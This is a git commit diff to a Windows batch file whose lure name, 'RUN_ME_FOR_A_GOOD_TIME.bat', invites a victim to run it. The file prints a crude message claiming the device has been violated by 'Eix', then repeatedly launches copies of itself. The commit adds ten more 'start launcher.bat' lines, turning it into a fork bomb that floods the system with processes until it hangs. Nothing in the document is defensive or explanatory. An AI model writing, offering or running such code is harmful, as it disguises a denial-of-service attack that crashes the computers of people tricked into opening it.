47c5498dcc2fa6f3bd5d7cffc359fceb21150c40
NicoAICP <nicohaberkorn@gmx.de>
2017-12-23 19:15:19 +0100

    Update RUN_ME_FOR_A_GOOD_TIME.bat

--- RUN_ME_FOR_A_GOOD_TIME.bat
+++ RUN_ME_FOR_A_GOOD_TIME.bat
@@ -4,6 +4,16 @@ ECHO Your Windows Device has just been analy violated by Eix, Have a nice day!
 Pushd "%~dp0"
 title Eix%random%
 timeout /t 1 /nobreak >nul
+start launcher.bat
+start launcher.bat
+start launcher.bat
+start launcher.bat
+start launcher.bat
+start launcher.bat
+start launcher.bat
+start launcher.bat
+start launcher.bat
+start launcher.bat
 start RUN_ME_FOR_A_GOOD_TIME.bat
 start RUN_ME_FOR_A_GOOD_TIME.bat
 start RUN_ME_FOR_A_GOOD_TIME.bat
